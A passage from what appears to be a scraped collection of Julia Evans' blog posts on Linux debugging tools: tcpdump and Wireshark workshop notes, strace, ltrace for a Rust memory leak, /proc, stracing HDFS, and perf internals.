trying to do packet capture on video streaming or something, and be aware that there may be customer data in there) \n “now we’re going to get timing information for those HTTP requests!” \n run  tcpdump port $correct_port -w output.pcap \n press ctrl+c when you feel like you have enough data \n “pcap files are like chocolate cookies – every packet analysis tool understands how to read them. So you can write the pcap file on the server and then copy it over for offline analysis” \n copy the file over to my laptop, get everyone else to copy over the file as well \n WIRESHARK TIME!!! =D =D =D \n “as you’ve seen, tcpdump output is a little difficult to interpret and search. some people are really good at that but IMO it’s easier to stick with a basic knowledge of tcpdump and do more advanced stuff in Wireshark” \n open up the pcap file in Wireshark. \n \n\n Wireshark features to demo: \n\n \n searching by HTTP status (try THAT with tcpdump!) \n right clicking on a packet to get every other packet in that TCP conversation \n click statistics -> conversations in the menu and you can sort all TCP sessions by duration to find performance problems \n you can colour packets by type (TCP/UDP/whatever) to more easily visually see what’s going on \n show where the packet timings show up, and talk through how you can use this to diagnose whether the client or the server is the problem (if the client sends a packet and then the server takes 5 seconds to reply to it, that’s AWESOME EVIDENCE) \n ask other people in the room with experience for their favorite Wireshark features and tactics to get information about it. people had really great suggestions. \n \n\n that’s all for tcpdump! \n\n strace \n\n step 1: system calls & how to read strace output \n\n \n talk about what a system call is “the API for your operating system” \n run strace on a small program like  ls \n talk through what the parts of the output mean (“this is the system call, this is a file descriptor, these are the arguments”) \n explain what happens in  strace ls  (first you have  execve(ls) , then the dynamic linker happens, the first part of the strace output is always the same, then you see stuff that’s more specific to  ls , and at the end you have  exit ) \n \n\n step 2: getting configuration files \n\n \n Find a Java program which has some configuration \n “we have no idea how it’s configured! How will we ever find out?” \n STRACE OBVIOUSLY \n run  strace -e open -o strace_output.txt the_java_program  (I used a Hadoop program).  -e  means “this system call” and  -o  writes the output to a file \n it turns out that this actually doesn’t work if the Java program starts child processes – you usually want to run  strace -f . \n Run  strace -f  instead \n grep the output file for  .xml  because practically every java program is configured with xml \n we find our configuration file! we are winners \n mention looking at calls to  write \n \n\n step 3: attaching to a running program, and strace a CPU-only program \n\n run \n\n while True:\n    pass\n \n\n and then attach to it with  sudo strace -p . When you’re attaching, you always have to run as root. This program doesn’t have any system calls! \n\n If you want another cool demo of stracing a running program,  find  is a good example, run  find /  and then attach to it with strace – it’ll show you which files  find  is looking at right now! \n\n step 4: stracing to understand a performance problem \n\n \n (secretly, beforehand) make a tiny flask server that responds to  GET /hello  with ‘hi!’ after sleeping for 2 seconds \n run a small bash script that just runs curl in a loop \n the script is slow! But why is it slow? \n run  strace  on the script, and see how you can see it pause really clearly on the  wait . Talk about other system calls you’ll often see strace pause (select) \n now is a really good time to mention that STRACING PRODUCTION PROGRAMS WILL SLOW THEM DOWN AND YOU NEED TO BE VERY CAREFUL. Sometimes you do it anyway if the process is a mess \n talk about what to do if you don’t know what a system call means (what’s  wait4 ? You can run  man 2 wait4  on any system to get the man page for that system call) \n \n\n done! \n\n \n Break for questions. \n mention that I wrote a  zine about strace  which is an ok basic reference \n \n\n yay! \n\n I thought this went pretty well, especially given that I prepared it only 2 hours in advance. I think I’ll do it again sometime! I want to get better at doing workshops and talks at least 2-3 times because preparing good material is so hard, and I always learn so much about the talk/workshop the first time I give it. \n\n If you want to adapt this workshop for your cool friends who you want know about strace or tcpdump, you could! Most likely this is way too sketchy for anybody else to use but me. \n\n"},
{"url": "https://jvns.ca/blog/2016/06/15/using-ltrace-to-debug-a-memory-leak/", "title": "Using ltrace to debug a memory leak", "content": "\n     \n\n Yesterday, I used ltrace to debug something for the first time! I was looking at a memory leak in a Rust async library with Kamal, and it was leaking 500 bytes of memory every time we made a request to the web server that used it. Not good! \n\n what’s ltrace? \n\n ltrace traces  library calls . This is cool because there are a lot of important things that happen that don’t go through the kernel! \n\n For example – one thing that took me a while to learn is that memory allocation with  malloc  and  free  aren’t something that your operating system handles. Your OS gives you huge chunks of memory, but the business of keeping track of which bits of it have been allocated is up to you. \n\n Here’s a little bit of what happens when I run  ltrace ls \n\n malloc(552)      = 0xf4d010\nmalloc(120)      = 0xf4d240\nmalloc(1024)     = 0xf4d2c0\nfree(0xf4d2c0)   = <void>\nfree(0xf4d010)   = <void>\nmalloc(5)        = 0xf4d010\nfree(0xf4d010)   = <void>\nmalloc(120)      = 0xf4d030\n \n\n This is neat! We can see that we allocated 1024 bytes of memory to get  0xf4d2c0  and then free that address shortly after. \n\n how do you find a memory leak? \n\n A memory leak is when either you forget to free memory even though nothing refers to it anymore (pretty common in C), or when you accidentally keep a reference around to memory even though you don’t actually need it, and it’s prevented from being garbage collected (pretty common in Python). \n\n Since this is Rust, and memory that isn’t being referred to gets freed, we probably have the second kind of problem. But where?! \n\n We tried using valgrind to find the memory leak, but that was not super successful. It was like “dude here are some huge stack traces in this library you don’t really understand” and we were like “I don’t know what that means”. \n\n Then I thought – ltrace! I know what ltrace is! \n\n Since 500 bytes of memory were leaked every time we made a HTTP request to our leaking web server, we ran  ltrace  on the web server. Here’s what happened when we made the HTTP request: \n\n ... a bunch of mallocs and frees ...\nsend(7, \"some string\")\nmalloc(32)      = 0xf4d010\nmalloc(32)      = 0xf4d030\n... a bunch of mallocs and frees ...\n \n\n We used  grep  to find out that  0xf4d010 … never got freed! A MEMORY LEAK! WE WIN. But where? What are those 32 bytes? \n\n There is probably a smart and clever way to figure what the 32 bytes are. Instead, we added print statements to our program to try to find the leak. This was made a lot easier because of that  send  clue – we knew the leak had to be near where we wrote to the TCP socket. After adding the print statements and experimenting a bit, the ltrace output looked like: \n\n ... a bunch of mallocs and frees ...\nsend(7, \"some string\")\nwrite(\"this is before the leak\")\nmalloc(32)      = 0xf4d010\nmalloc(32)      = 0xf4d030\nwrite(\"this is after the leak\")\n... a bunch of mallocs and frees ...\n \n\n Our corresponding Rust code looked like \n\n println!(\"this is before the leak\");\ndo_thing_1.boxed();\ndo_thing_2.boxed();\nprintln!(\"this is after the leak\");\n \n\n Guess what  .boxed()  means in this program? It means “do an allocation and put this on the heap”! Or in other words,  malloc . We found the leaking allocation! Yay! \n\n In general in Rust  Box::new  is a way to allocate something on the heap. \n\n At this point I was tired so I fell asleep. This isn’t done, of course – we still need to chase the Rust program to figure out why that allocation never gets freed. But it’s a start! \n\n I’m always really happy when I make progress a bug using a thing in my toolkit I haven’t used properly before. Yay ltrace! \n\n"},
{"url": "https://jvns.ca/blog/2014/04/20/debug-your-programs-like-theyre-closed-source/", "title": "Debug your programs like they're closed source!", "content": "\n      Until very recently, if I was debugging a program, I practically\nalways did one of these three things: \n\n \n open a debugger \n look at the source code \n insert some print statements \n \n\n I’ve started sometimes debugging a new way. With this method, I don’t\nlook at the source code, don’t edit the source code, and don’t use a\ndebugger. I don’t even need to have the program’s source available to\nme! \n\n Can we repeat that again? I can look at the internal behavior of\n closed-source programs . \n\n How?!?! AM I A WIZARD? Nope. SYSTEM CALLS! What is a system call?\nOperating systems know how to open files, display things to the\nscreen, start processes, and all kinds of things. Programs can ask\ntheir operating system to do these things, using functions called\n system calls . \n\n \n\n System calls are the API for your computer, so you don’t have to know\nhow a network card works to send a HTTP request. \n\n Here’s a list of the\n system calls Linux 2.2 \nprovides, to give you a sense for what’s available. There’s  exit ,\n open ,  read ,  write ,  time ,  mount ,  kill , and all kinds of\nother things. System calls are basically the definition of platform\nspecific (different operating system have different system calls), so\nwe’re only going to be talking about Linux here. \n\n How can we use these to debug? Here are a few of my favorite system\ncalls! \n\n open \n\n open  opens files. Every time any program opens a file it needs to\nuse the  open  system call. There’s no other way. \n\n So! Let’s say you have a backup program on your computer, and you want\nto know which files it’s working on. And that it doesn’t show you a\nprogress bar or have any options. Let’s say that it has PID 60. \n\n We can spy on this program with a tool called  strace  and print out\nevery file it opens!  strace  shows you which system calls a program\ncalls. To spy on our backup program, we would run  strace -e trace=open\n-p 60 , to tell it to print all the  open  system calls from PID 60. \n\n For example, I ran  strace -e trace=open ssh  and here were some of the\nthings I found: \n\n \nopen(\"/etc/ssh/ssh_config\", O_RDONLY)   = 3\nopen(\"/home/bork/.ssh/config\", O_RDONLY) = 3\nopen(\"/home/bork/.ssh/id_dsa\", O_RDONLY) = 4\nopen(\"/home/bork/.ssh/id_dsa.pub\", O_RDONLY) = 4\nopen(\"/home/bork/.ssh/id_rsa\", O_RDONLY) = 4\nopen(\"/home/bork/.ssh/id_rsa.pub\", O_RDONLY) = 4\nopen(\"/home/bork/.ssh/known_hosts\", O_RDONLY) = 4\n \n\n This makes total sense!  ssh  needs to read my private and public\nkeys, my local ssh config, and the global ssh config. Neat!  open  is\nsuper simple and super useful. \n\n execve \n\n execve  starts programs. All programs. There’s no way to start a\nprogram except to use  execve . We can use  strace  to spy on  execve \ncalls too! \n\n For example! I was trying to understand a Ruby script that was\nbasically just running some  ssh  commands. I could have read the Ruby\ncode! But I really just wanted to know which damn command it was\nrunning! I did this by running  strace -f -s3000 -e trace=execve  and\nread zero code! \n\n The  -f  option is super important here. It also tracks the system\ncalls of every subprocess! I basically use  -f  all the time. Use\n -f .\n( [longer blog post about using strace + execve to poke at Ruby programs] ). \n\n write \n\n write  writes to files. I think there are ways to write to a file\nwithout using  write  (like by using  mmap ), but  usually  if a file\nis being written to, it’s using  write . \n\n If I  strace -e trace=write  on an  ssh  session, this is some of what\nI see: \n\n \nwrite(3, \"SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1\\r\\n\", 41) = 41\n[...]\nwrite(5, \"[jvns /home/public]$ \", 21)   = 21\nwrite(3, \"\\242\\227e\\376\\344\\36\\270\\343\\331\\307\\231\\332\\373\\273\\324\\303X\\n<\\241p`\\212\\21\\317\\353`\\1/\\3629\\273m\\23\\17\\26\\304\\fJ\\352z\\210\\2\\210\\211~7W\", 48) = 48\nwrite(5, \"logout\\r\\n\", 8)               = 8\nwrite(3, \"b\\277\\306\\16!\\6J\\202\\tF$\\241\\32\\302\\3\\0\\23\\310\\346f\\241\\233\\263\\254\\325\\351z\\222\\234\\224\\270\\231\", 32) = 32\nwrite(3, \"\\311\\372\\353\\273\\233oU\\226~\\373N\\227\\323*S\\263\\307\\272\\204VzO \\10\\2\\316\\224\\335X@Hj\\26\\366\\271J:i6\\311\\240A\\325\\331\\341\\220\\1%\\233\\240\\23n\\23\\242\\34\\277\\2139\\376\\31j\\255\\32h\", 64) = 64\nwrite(2, \"Connection to ssh.phx.nearlyfreespeech.net closed.\\r\\n\", 52) = 52\n \n\n So it opens an SSH connection, writes a prompt to my terminal, sends\nsome (encrypted!) data over the connection, and prints that the\nconnection is closed! Neat! I understand a bit more about how ssh\nworks now! \n\n /proc \n\n I want to talk about one more Linux thing, and it isn’t a system call.\nIt’s a directory called  /proc ! There are a million things that\n /proc  does, but this is my favorite: \n\n /proc  tells you every file your process has open. All of them! For\nexample, one of my Chrome processes has PID 3823. If I run  ls -l\n/proc/3823/fd/* , it shows me all the files Chrome has open! \n\n fd  stands for “file descriptor”. \n\n \n$ ls -l /proc/3823/fd/*\ntotal 0\nlr-x------ 1 bork bork 64 Apr 19 09:28 0 -> /dev/null\nl-wx------ 1 bork bork 64 Apr 19 09:28 1 -> /dev/null\nlrwx------ 1 bork bork 64 Apr 19 09:28 10 -> socket:[16583]\nlr-x------ 1 bork bork 64 Apr 19 09:28 100 -> /opt/google/chrome/nacl_irt_x86_64.nexe\nlrwx------ 1 bork bork 64 Apr 19 09:28 101 -> /home/bork/.config/google-chrome/Default/Application Cache/Cache/index\nlrwx------ 1 bork bork 64 Apr 19 09:28 102 -> /home/bork/.config/google-chrome/Default/Application Cache/Cache/data_0\nlrwx------ 1 bork bork 64 Apr 19 09:28 103 -> socket:[178726]\nlrwx------ 1 bork bork 64 Apr 19 09:28 104 -> socket:[21064]\nlrwx------ 1 bork bork 64 Apr 19 09:28 105 -> /home/bork/.config/google-chrome/Default/Application Cache/Cache/data_1\nlrwx------ 1 bork bork 64 Apr 19 09:28 106 -> /home/bork/.config/google-chrome/Default/Application Cache/Cache/data_2\nlrwx------ 1 bork bork 64 Apr 19 09:28 107 -> /home/bork/.config/google-chrome/Default/Application Cache/Cache/data_3\n \n\n aaaand a million more. This is great. There are also a ton more things\nin  /proc/3823 . Look around! I wrote a bit more about  /proc  in\n Recovering files using /proc (and spying, too!) . \n\n ltrace: beyond system calls! \n\n Lots of things happen outside of the kernel. Like string comparisons!\nI don’t need a network card for that! What if we wanted to know about\nthose?  strace  won’t help us at all. But  ltrace  will! \n\n Let’s try running  ltrace killall firefox . We see a bunch of things\nlike this: \n\n \nfopen(\"/proc/10578/stat\", \"r\")                               => 0x11984f0\nfree(0x011984d0)\nfscanf(0x11984f0, 0x403fe7, 0x7fff09984980, 0x7f2fc7cd4728, 0)\nfclose(0x11984f0)\nstrcmp(\"firefox\", \"kworker/u:0\")\n \n\n So! We’ve just learned that  killall  works by opening a file in\n /proc  (wheeee!), finding what its name is, and seeing if it’s the\nsame as “firefox”. That makes sense! \n\n When are these tools useful? \n\n These systems-level debugging tools are only appropriate sometimes. If\nyou’re writing a graph traversal algorithm and it has a logical error,\nknowing which files it opened won’t help you at all! \n\n Here are some examples of times when using systems tools might make\nyour life easier: \n\n \n Is your program running a command, but the wrong one? Look at\n execve ! \n Your program communicates with something on a network, but some of\nthe information it’s sending is wrong? It’s probably sending it with\n write ,  sendto , or  send . \n Your program writes to a file, but you don’t know what file it’s\nwriting to? Use  /proc  to see what files it has open, or look at\nwhat it’s  write ing.  /proc  doesn’t lie. \n \n\n At first debugging this way is confusing, but once you’re familiar\nwith the tools it can actually be faster, because you don’t have to\nworry about getting the wrong information! And you feel like a WIZARD. \n\n Learn your operating system instead of a new debugger \n\n There are all kinds of programming-language-specific debugging tools\nyou can use.  gdb !  pry !  pdb ! And you should! But you probably\nswitch languages more often than you switch OSes. So, learning your OS\nin depth and then using it as a debugging tool is likely a better\ninvestment of your time than learning a language-specific debugging\ntool. \n\n If you want to know which files a process has open, it doesn’t matter\nif that program was originally written in C++ or Python or Java or\nHaskell. The  only way  for a program to open a file on Linux is with\nthe  open  system call. If you learn your operating system, you\nacquire superpowers. You can debug programs that are binary-only and\nclosed source. You can use the same tools to debug no matter which\nlanguage you’re writing. \n\n And my favorite thing about these methods is that your OS won’t lie to\nyou. The  only way  to run a program is with the  execve  system\ncall. There aren’t other ways. So if you really want to know what\ncommand got run, use  strace . See exactly which parameters get passed\nto  execve . You’ll know exactly what happened. \n\n Further reading \n\n Try Greg Price’s excellent blog post\n Strace – The Sysadmin’s Microscope .\nI have an\n ever-growing collection of blog posts about strace ,\ntoo! \n\n My favorite way to learn more, honestly, is to just strace random\nprograms and see what I find out. It’s a great way to spend a rainy\nSunday afternoon! =) \n\n Thanks to  Lindsey Kuper  and\n Dan Luu  for reading a draft of this :) \n\n Have fun! \n"},
{"url": "https://jvns.ca/blog/2014/12/10/spying-on-hadoop-with-strace/", "title": "Spying on Hadoop with strace", "content": "\n      As you may already know, I really like strace. (It has a\n whole category on this blog ).\nSo when the people at Big Data Montreal asked if I wanted to give a talk\nabout stracing Hadoop, the answer was YES OBVIOUSLY. \n\n I set up a small Hadoop cluster (1 master, 2 workers, replication set to\n1) on Google Compute Engine to get this working, so that’s what we’ll be\ntalking about. It has one 14GB CSV file, which contains part of this\n Wikipedia revision history dataset \n\n Let’s start diving into HDFS! (If this is familiar to you, I talked\nabout a lot of this already in  Diving into HFDS . There are new\nthings, though! At the end of this we edit the blocks on the data node\nand see what happens and it’s GREAT.) \n\n \n\n $ snakebite ls -h /\n-rw-r--r--   1 bork       supergroup       14.1G 2014-12-08 02:13 /wikipedia.csv\n \n\n Files are split into blocks \n\n HDFS is a distributed filesystem, so a file can be split across many\nmachines. I wrote a little module to help explore how a file is\ndistributed. Let’s take a look! \n\n You can see the source code for all this in\n hdfs_fun.py . \n\n import hdfs_fun\nfun = hdfs_fun.HDFSFun()\nblocks = fun.find_blocks('/wikipedia.csv')\nfun.print_blocks(blocks)\n \n\n which outputs \n\n      Bytes |   Block ID | # Locations |       Hostnames\n 134217728 | 1073742025 |           1 |      hadoop-w-1\n 134217728 | 1073742026 |           1 |      hadoop-w-1\n 134217728 | 1073742027 |           1 |      hadoop-w-0\n 134217728 | 1073742028 |           1 |      hadoop-w-1\n 134217728 | 1073742029 |           1 |      hadoop-w-0\n 134217728 | 1073742030 |           1 |      hadoop-w-1\n ....\n 134217728 | 1073742136 |           1 |      hadoop-w-0\n  66783720 | 1073742137 |           1 |      hadoop-w-1\n \n\n This tells us that  wikipedia.csv  is split into 113 blocks, which are\nall 128MB except the last one, which is smaller. They have block IDs\n1073742025 - 1073742137. Some of them are on hadoop-w-0, and some are on\nhadoop-w-1. \n\n Let’s see the same thing using strace! \n\n  $ strace -f -o strace.out snakebite cat /wikipedia.csv | head\n \n\n Part 1: talk to the namenode! \n\n We ask the namenode where /wikipedia.csv is… \n\n connect(4, {sa_family=AF_INET, sin_port=htons(8020),\n    sin_addr=inet_addr(\"10.240.98.73\")}, 16)\nsendto(4,\n    \"\\n\\21getBlockLocations\\22.org.apache.hadoop.hdfs.protocol.ClientProtocol\\30\\1\",\n    69, 0, NULL, 0) = 69\nsendto(4, \"\\n\\16/wikipedia.csv\\20\\0\\30\\350\\223\\354\\2378\", 24, 0, NULL, 0) = 24\n \n\n … and get an answer! \n\n \nrecvfrom(4,\n\"\\255\\202\\2\\n\\251\\202\\2\\10\\350\\223\\354\\2378\\22\\233\\2\\n7\\n'BP-572418726-10.240.98.73-1417975119036\\20\\311\\201\\200\\200\\4\\30\\261\\t\n\\200\\200\\200@\\20\\0\\32\\243\\1\\nk\\n\\01610.240.146.168\\22% hadoop-w-1 .c.stracing-hadoop.internal\\32$358043f6-051d-4030-ba9b-3cd0ec283f6b\n\\332\\206\\3(\\233\\207\\0030\\344\\206\\0038\\0\\20\\200\\300\\323\\356&\\30\\200\\300\\354\\372\\32\n\\200\\240\\377\\344\\4(\\200\\300\\354\\372\\0320\\374\\260\\234\\276\\242)8\\1B\\r/default-rackP\\0X\\0`\\0\n\\0*\\10\\n\\0\\22\\0\\32\\0\\\"\\0002\\1\\0008\\1B'DS-3fa133e4-2b17-4ed1-adca-fed4767a6e6f\\22\\236\\2\\n7\\n'BP-572418726-10.240.98.73-1417975119036\\20\\312\\201\\200\\200\\4\\30\\262\\t\n\\200\\200\\200@\\20\\200\\200\\200@\\32\\243\\1\\nk\\n\\01610.240.146.168\\22% hadoop-w-1 .c.stracing-hadoop.internal\\32$358043f6-051d-4030-ba9b-3cd0ec283f6b\n\\332\\206\\3(\\233\\207\\0030\\344\\206\\0038\\0\\20\\200\\300\\323\\356&\\30\\200\\300\\354\\372\\32\n\\200\\240\\377\\344\\4(\\200\\300\\354\\372\\0320\\374\\260\\234\\276\\242)8\\1B\\r/default-rackP\\0X\\0`\\0\n\\0*\\10\\n\\0\\22\\0\\32\\0\\\"\\0002\\1\\0008\\1B'DS-3fa133e4-2b17-4ed1-adca-fed4767a6e6f\\22\\237\\2\\n7\\n'BP-572418726-10.240.98.73-1417975119036\\20\\313\\201\\200\\200\\4\\30\\263\\t\n\\200\\200\\200@\\20\\200\\200\\200\\200\\1\\32\\243\\1\\nk\\n\\01610.240.109.224\\22% hadoop-w-0 .c.stracing-hadoop.internal\\32$bd6125d3-60ea-4c22-9634-4f6f352cfa3e\n\\332\\206\\3(\\233\\207\\0030\\344\\206\\0038\\0\\20\\200\\300\\323\\356&\\30\\200\\240\\342\\335\\35\n\\200\\240\\211\\202\\2(\\200\\240\\342\\335\\0350\\263\\257\\234\\276\\242)8\\1B\\r/default-rackP\\0X\\0`\\0\n\\0*\\10\\n\\0\\22\\0\\32\\0\\\"\\0002\\1\\0008\\1B'DS-c5ef58ca-95c4-454d-adf4-7ceaf632c035\\22\\237\\2\\n7\\n'BP-572418726-10.240.98.73-1417975119036\\20\\314\\201\\200\\200\\4\\30\\264\\t\n\\200\\200\\200@\\20\\200\\200\\200\\300\\1\\32\\243\\1\\nk\\n\\01610.240.146.168\\22% hadoop-w-1 .c.stracing-hadoop.inte\"...,\n33072, 0, NULL, NULL) = 32737\n \n\n The hostnames in this answer totally match up with the table of where we\nthink the blocks are! \n\n Part 2: ask the datanode for data! \n\n So the next part is that we ask  10.240.146.168  for the first block. \n\n connect(5, {sa_family=AF_INET, sin_port=htons(50010), sin_addr=inet_addr(\"10.240.146.168\")}, 16) = 0\nsendto(5, \"\\nK\\n>\\n2\\n'BP-572418726-10.240.98.73-1417975119036\\20\\311\\201\\200\\200\\4\\30\\261\\t\\22\\10\\n\\0\\22\\0\\32\\0\\\"\\0\\22\\tsnakebite\\20\\0\\30\\200\\200\\200@\", 84, 0, NULL, 0) = 84\nrecvfrom(5, \"title,id,language,wp_namespace,is_redirect,revision_id,contributor_ip,contributor_id,contributor_username,timestamp,is_minor,is_bot,reversion_id,comment,num_characters\\nIvan Tyrrell,6126919,,0,true,264190184,,37486,Oddharmonic,1231992299,,,,\\\"Added defaultsort tag, categories.\\\",2989\\nInazuma Raigor\\305\\215,9124432,,0,,224477516,,2995750,ACSE,1215564370,,,,/* Top division record */ rm jawp reference,5557\\nJeb Bush,189322,,0,,299771363,66.119.31.10,,,1246484846,,,,/* See also */,43680\\nTalk:Goranboy (city),18941870,,1,,\", 512, 0, NULL, NULL) = 512\nrecvfrom(5, \"233033452,,627032,OOODDD,1219200113,,,,talk page tag  using [[Project:AutoWikiBrowser|AWB]],52\\nTalk:Junk food,713682,,1,,210384592,,6953343,D.c.camero,1210013227,,,,/* Misc */,13654\\nCeline Dion (album),3294685,,0,,72687473,,1386902,Max24,1156886471,,,,/* Chart Success */,4578\\nHelle Thorning-Schmidt,1728975,,0,,236428708,,7782838,Vicki Reitta,1220614668,,,,/* Member of Folketing */  updating (according to Danish wikipedia),5389\\nSouthwest Florida International Airport,287529,,0,,313446630,76.101.171.136,,,125\", 512, 0, NULL, NULL) = 512\n \n\n $ strace -e connect snakebite cat /wikipedia.csv > /dev/null\nconnect(5, {sa_family=AF_INET, sin_port=htons(50010), sin_addr=inet_addr(\"10.240.146.168\")}, 16) = 0\nconnect(5, {sa_family=AF_INET, sin_port=htons(50010), sin_addr=inet_addr(\"10.240.146.168\")}, 16) = 0\nconnect(5, {sa_family=AF_INET, sin_port=htons(50010), sin_addr=inet_addr(\"10.240.109.224\")}, 16) = 0\nconnect(5, {sa_family=AF_INET, sin_port=htons(50010), sin_addr=inet_addr(\"10.240.146.168\")}, 16) = 0\nconnect(5, {sa_family=AF_INET, sin_port=htons(50010), sin_addr=inet_addr(\"10.240.109.224\")}, 16) = 0\n \n\n This sequence matches up exactly with the order of the blocks in the\ntable up at the top! So fun. Next, we can look at the message the client\nis sending to the datanodes: \n\n sendto(5, \"\\nK\\n>\\n2\\n'BP-572418726-10.240.98.73-1417975119036\\20\\311\\201\\200\\200\\4\\30\\261\\t\\22\\10\\n\\0\\22\\0\\32\\0\\\"\\0\\22\\tsnakebite\\20\\0\\30\\200\\200\\200@\", 84, 0, NULL, 0) = 84\n \n\n This is a little hard to read, but it turns out it’s a\n Protocol Buffer  and so we can\nparse it pretty easily. Here’s what it’s trying to say: \n\n OpReadBlockProto\nheader {\n  baseHeader {\n    block {\n      poolId: \"BP-572418726-10.240.98.73-1417975119036\"\n      blockId: 1073742025\n      generationStamp: 1201\n    }\n    token {\n      identifier: \"\"\n      password: \"\"\n      kind: \"\"\n      service: \"\"\n    }\n  }\n  clientName: \"snakebite\"\n}\n \n\n And then, of course, we get a response: \n\n recvfrom(5,\"title,id,language,wp_namespace,is_redirect,revision_id,contributo\nr_ip,contributor_id,contributor_username,timestamp,is_minor,is_bot\n,reversion_id,comment,num_characters\\nIvanTyrrell,6126919,,0,true,264190184,,\n37486,Oddharmonic,1231992299,,,,\\\"Addeddefaultsorttag,categorie\ns.\\\",2989\\nInazumaRaigor\\305\\215,9124432,,0,,224477516,,2995750,ACSE,12155643\n70,,,,/*Topdivisionrecord*/rmjawpreference,5557\\nJebBush,1\n89322,,0,,299771363,66.119.31.10,,,1246484846,,,,/*Seea\n \n\n Which is just the beginning of a CSV file! How wonderful. \n\n Part 3: Finding the block on the datanode. \n\n Seeing the datanode send us the data is nice, but what if we want to get\neven closer to the data? It turns out that this is really easy. I sshed\nto my data node and ran \n\n $ locate 1073742025\n \n\n with the idea that maybe there was a file with  1073742025  in the name that had the block data. And there was! \n\n $ cd /hadoop/dfs/data/current/BP-572418726-10.240.98.73-1417975119036/current/finalized\n$ ls -l blk_1073742025\n-rw-r--r-- 1 hadoop hadoop 134217728 Dec 8 02:08 blk_1073742025\n \n\n It has exactly the right size (134217728 bytes), and if we look at the beginning, it contains exactly the data from the first 128MB of the CSV file. GREAT. \n\n Super fun exciting part:  Editing  the block on the datanode \n\n So I was giving this talk yesterday, and was doing a live demo where I\nwas ssh’d into the data node, and we were looking at the file for the\nblock. And suddenly I thought… WAIT WHAT IF WE EDITED IT GUYS?! \n\n And someone commented “No, it won’t work, there’s metadata, the checksum\nwill fail!“. So, of course, we tried it, because toy clusters are for\nbreaking. \n\n And it worked! Which wasn’t perhaps super surprising because replication\nwas set to 1 and maybe a 128MB file is too big to take a checksum of\nevery time you want to read from it, but REALLY FUN. I edited the\nbeginning of the file to say  AWESOME AWESOME AWESOME  instead of\nwhatever it said before (keeping the file size the same), and then a\n snakebite cat /wikipedia.csv  showed the file starting with  AWESOME\nAWESOME AWESOME . \n\n So some lessons: \n\n \n I’d really like to know more about data consistency in Hadoop clusters \n live demos are GREAT \n writing a blog is great because then people ask me to give talks about\nfun things I write about like stracing Hadoop \n \n\n That’s all folks! There are  slides for the talk I gave , though\nthis post is guaranteed to be much better than the slides. And maybe\nvideo for that talk will be up at some point. \n"},
{"url": "https://jvns.ca/blog/2015/03/30/seeing-system-calls-with-perf-instead-of-strace/", "title": "Seeing system calls with perf instead of strace", "content": "\n     \n\n I’m at a local hackerspace this evening, and I decided to get  perf \nworking on my computer again. You all know by now that I’m pretty into\nstrace, but – strace is not always a good choice! If your program runs\ntoo many system calls, strace will slow it down. A lot. \n\n Let’s try it and see: \n\n $ time du -sh ~/work\n0.04 seconds\n$ time strace -o out du -sh ~/work\n2.66 seconds\n \n\n That’s 65 times slower! This is because  du  needed to use 260,000\nsystem calls, which is uh a lot. If you strace a program with less\nsystem calls it won’t be that big of a deal. But what if we still want\nto know what  du  is doing, and  du  is actually a Really Important\nProgram like a database or something? \n\n WE’RE GOING TO USE PERF =D =D. \n\n I’ve been eyeing Brendan Gregg’s\n page on perf \nand the  kernel.org tutorial \nfor almost a year now, and we learned in May last year that\n perf lets you count CPU cycles , which is\ncool! But perf is capable of way more stuff. \n\n Here’s how we record what system calls  du  is using: \n\n sudo perf record -e 'syscalls:sys_enter_*' du -sh ~/work\n \n\n This finishes right away, except that perf takes a little extra time to\nwrite its recorded data to desk. Then we can see the system calls with\n sudo perf script , which shows us something like this: \n\n du 25156 [003] 142769.540801: syscalls:sys_enter_newfstatat:\n       dfd: 0x00000006, filename: 0x021b0b58, statbuf: 0x021b0ac8, flag: 0x0\ndu 25156 [003] 142769.540802: syscalls:sys_enter_close:\n       fd: 0x00000006\ndu 25156 [003] 142769.540804: syscalls:sys_enter_newfstatat: \n       dfd: 0x00000005, filename: 0x021b4708, statbuf: 0x021b4678, flag: 0x0\n \n\n This is showing us system calls! You can see the file descriptors –\n fd: 0x00000006 . But it doesn’t give us the filename, just… the\naddress of the filename? I don’t know how to get the actual filename out\nand that makes me sad. \n\n It’s called  perf script  because you can write scripts with the output\n(like this  flamegraph script !).\nLike maybe you could pretty it up and have a script that’s like strace\nbut doesn’t slow your program down so much. Apparently  perf script -g python \nwill automatically generate boilerplate for a perf script in Python for\nme! But it doesn’t work because I need to recompile perf. So we’ll see\nabout that :) \n\n That’s all I have to say for now! Mostly I’m writing this up in the\nhopes that someone will either a) tell me how to get perf to give me the\nactual filename or b) tell me why it’s unreasonable to expect perf to do\nthat. \n\n"},
{"url": "https://jvns.ca/blog/2016/03/12/how-does-perf-work-and-some-questions/", "title": "How does perf work? (in which we read the Linux kernel source)", "content": "\n     \n\n perf is a profiling tool for Linux, that I’ve written about  a few times  on this blog before. I was interviewed on  a podcast  recently where the host asked me “so, julia, tell me how perf works!” and I gave a sort of unsatisfying answer “you know, sampling?”. \n\n So it turns out I don’t really know how perf works. And I like knowing how stuff works. Last week I read some of the  man page for  perf_event_open , the system call that perf uses. It’s 10,000 words but pretty helpful! I’m still quite confused about perf, so I’m going to tell you, fair reader, what I know, and then maybe you can help me out with my questions. \n\n There is not a lot of documentation for perf. The best resource I know is on  Brendan Gregg’s site , but it does not answer all the questions I have! To answer some of these questions, we’re going to read the Linux kernel source code. Because it’s Saturday night. \n\n Hardware counters \n\n So, let’s imagine you want to know exactly how many CPU instructions happen when you run  ls . It turns out that your CPU stores information about this kind of thing! And perf can tell you. Here’s what the answer looks like, from  perf stat . \n\n $ sudo perf stat ls\n         1,482,453 instructions              #    0.48  insns per cycle        \n\n \n\n But how does that  work ? Well, the  Wikipedia page on hardware performance counters  mentions \n\n \n One of the first processors to implement such counter and an associated\ninstruction  RDPMC  to access it was the Intel Pentium, but they were not\ndocumented until Terje Mathisen wrote an article about reverse engineering\nthem in Byte July 1994: [1] \n \n\n We can use  http://livegrep.com  to search the Linux kernel for the  rdpmc  instruction. Here’s it being used in a cryptic  header file called msr.h \n\n static inline unsigned long long native_read_pmc(int counter)\n{\n    DECLARE_ARGS(val, low, high);\n\n    asm volatile(\"rdpmc\" : EAX_EDX_RET(val, low, high) : \"c\" (counter));\n    return EAX_EDX_VAL(val, low, high);\n}\n \n\n This is AWESOME. Maybe this is how Linux reads hardware counters and gives them back to us in  perf stat !! Further grepping for uses of  native_read_pmc  reveals that we read hardware counters via  rdpmcl  in  x86/kernel/cpu/perf_event.c . \n\n This code is a little impenetrable to me, but here’s a hypothesis for how this could work. Let’s say we’re 